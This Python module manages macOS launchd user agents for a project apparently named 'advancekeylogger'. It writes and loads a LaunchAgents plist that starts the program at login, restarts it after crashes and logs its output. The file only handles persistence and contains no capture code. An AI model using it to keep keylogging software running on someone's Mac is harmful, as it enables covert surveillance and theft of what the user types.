"""
launchd integration for macOS.
"""
from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path


class LaunchdManager:
    """Manage launchd user agents."""

    def install(self, spec) -> str:
        plist_path = _plist_path(spec.name)
        plist_path.parent.mkdir(parents=True, exist_ok=True)
        plist_path.write_text(_render_plist(spec), encoding="utf-8")
        _run(["launchctl", "load", "-w", str(plist_path)], check=False)
        return f"Installed launchd agent at {plist_path}"

    def uninstall(self, spec) -> str:
        plist_path = _plist_path(spec.name)
        _run(["launchctl", "unload", "-w", str(plist_path)], check=False)
        if plist_path.exists():
            plist_path.unlink()
        return f"Uninstalled launchd agent {spec.name}"

    def start(self, spec) -> str:
        label = _label(spec.name)
        _run(["launchctl", "start", label], check=False)
        return f"Started launchd agent {spec.name}"

    def stop(self, spec) -> str:
        label = _label(spec.name)
        _run(["launchctl", "stop", label], check=False)
        return f"Stopped launchd agent {spec.name}"

    def restart(self, spec) -> str:
        label = _label(spec.name)
        _run(["launchctl", "stop", label], check=False)
        _run(["launchctl", "start", label], check=False)
        return f"Restarted launchd agent {spec.name}"

    def status(self, spec) -> str:
        result = _run(["launchctl", "list", spec.name], check=False)
        if result.returncode == 0:
            return f"{spec.name}: running"
        return f"{spec.name}: not loaded"


def _plist_path(name: str) -> Path:
    label = _label(name)
    return Path.home() / "Library" / "LaunchAgents" / f"{label}.plist"


def _label(name: str) -> str:
    return f"com.advancekeylogger.{name}"


def _render_plist(spec) -> str:
    python_path = os.environ.get("PYTHON_BIN", sys.executable)
    label = _label(spec.name)
    project_dir = str(Path(__file__).resolve().parent.parent)
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>WorkingDirectory</key>
    <string>{project_dir}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_path}</string>
        <string>-m</string>
        <string>main</string>
        <string>--config</string>
        <string>{spec.config_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>{Path.home() / "Library" / "Logs" / "advancekeylogger.out.log"}</string>
    <key>StandardErrorPath</key>
    <string>{Path.home() / "Library" / "Logs" / "advancekeylogger.err.log"}</string>
</dict>
</plist>
"""


def _run(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, capture_output=True, text=True, check=check)
